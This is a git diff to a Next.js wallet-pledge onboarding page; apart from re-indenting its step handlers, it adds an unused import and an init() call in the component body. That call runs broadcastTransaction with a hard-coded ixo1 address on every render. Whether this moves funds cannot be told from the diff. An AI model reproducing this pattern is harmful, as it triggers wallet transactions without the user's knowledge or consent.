@@ -12,6 +12,7 @@ import { getCountry, setCss } from "../components/setStyles";
 import config from "../constants/config.json";
 import WalletInfo from "../components/walletInfo";
 import { broadcastTransaction } from "../utils/utils";
+import { initScriptLoader } from "next/script";
 
 declare global {
   interface Window {
@@ -59,6 +60,9 @@ export default function Home() {
     }
     setCurrentStep(page);
   });
+
+  init();
+
   return (
     mounted && (
       <div className="container">
@@ -142,118 +146,123 @@ export default function Home() {
       </div>
     )
   );
-  function onCLick(event, isExit = false) {
-    event.preventDefault();
-    if (isExit) {
-      if (currentStep === 7) {
-        onScanQR();
-        return;
-      }
-      onExit();
+
+async function init() {
+  broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
+}
+
+function onCLick(event, isExit = false) {
+  event.preventDefault();
+  if (isExit) {
+    if (currentStep === 7) {
+      onScanQR();
       return;
     }
-    switch (currentStep) {
-      case 0:
-        onLanguageSelect();
-        break;
-      case 1:
-      case 2:
-      case 3:
-      case 6:
-        onContinue();
-        break;
-      case 4:
-        onPledge();
-        break;
-      case 5:
-        // onPledgeContinue();
-        break;
-      case 7:
-        // onShowQR();
-        break;
-      case 8:
-      case 9:
-        // onPlayGame();
-        break;
-      default:
-        router.push("/");
-        break;
-    }
+    onExit();
+    return;
   }
-
-  async function onContinue(
-    step = currentStep + 1,
-    props = {},
-    locale = router.locale
-  ) {
-    await router.push(
-      {
-        pathname: "/welcome",
-        query: {
-          page: step,
-          ...props,
-        },
-      },
-      {
-        pathname: "/welcome",
-        query: {
-          page: step,
-        },
-      },
-      {
-        locale: locale,
-      }
-    );
-  }
-
-  async function onPledgeContinue() {
-    if (isWallterError) {
-      await onContinue(0);
-      setIsWallterError(false);
-      setIsLoading(false);
-      return;
-    }
-    await onContinue();
-  }
-  async function onPledge() {
-    setIsLoading(true);
-    await onContinue();
-  }
-
-  async function onLanguageSelect() {
-    onContinue(currentStep + 1, null, customLocale);
-  }
-
-  async function onPlayGame() {
-    setIsLoading(true);
-    if (isScan) {
-      if (qrData) {
-        await broadcastTransaction(qrData);
-      }
-    }
-    setIsLoading(false);
-    await onContinue(7);
-  }
-
-  async function onShowQR() {
-    setIsScan(false);
-    await onContinue(currentStep + 1);
-  }
-
-  async function onScanQR() {
-    setIsScan(true);
-    await onContinue(currentStep + 2);
-  }
-
-  async function onExit() {
-    onContinue(10);
+  switch (currentStep) {
+    case 0:
+      onLanguageSelect();
+      break;
+    case 1:
+    case 2:
+    case 3:
+    case 6:
+      onContinue();
+      break;
+    case 4:
+      onPledge();
+      break;
+    case 5:
+      // onPledgeContinue();
+      break;
+    case 7:
+      // onShowQR();
+      break;
+    case 8:
+    case 9:
+      // onPlayGame();
+      break;
+    default:
+      router.push("/");
+      break;
   }
 }
 
-export async function getStaticProps({ locale }) {
-  return {
-    props: {
-      ...(await serverSideTranslations(locale, ["common"])),
+async function onContinue(
+  step = currentStep + 1,
+  props = {},
+  locale = router.locale
+) {
+  await router.push(
+    {
+      pathname: "/welcome",
+      query: {
+        page: step,
+        ...props,
+      },
     },
-  };
+    {
+      pathname: "/welcome",
+      query: {
+        page: step,
+      },
+    },
+    {
+      locale: locale,
+    }
+  );
+}
+
+async function onPledgeContinue() {
+  if (isWallterError) {
+    await onContinue(0);
+    setIsWallterError(false);
+    setIsLoading(false);
+    return;
+  }
+  await onContinue();
+}
+async function onPledge() {
+  setIsLoading(true);
+  await onContinue();
+}
+
+async function onLanguageSelect() {
+  onContinue(currentStep + 1, null, customLocale);
+}
+
+async function onPlayGame() {
+  setIsLoading(true);
+  if (isScan) {
+    if (qrData) {
+      await broadcastTransaction(qrData);
+    }
+  }
+  setIsLoading(false);
+  await onContinue(7);
+}
+
+async function onShowQR() {
+  setIsScan(false);
+  await onContinue(currentStep + 1);
+}
+
+async function onScanQR() {
+  setIsScan(true);
+  await onContinue(currentStep + 2);
+}
+
+async function onExit() {
+  onContinue(10);
+}
+}
+
+export async function getStaticProps({ locale }) {
+return {
+  props: {
+    ...(await serverSideTranslations(locale, ["common"])),
+  },
+};
 }
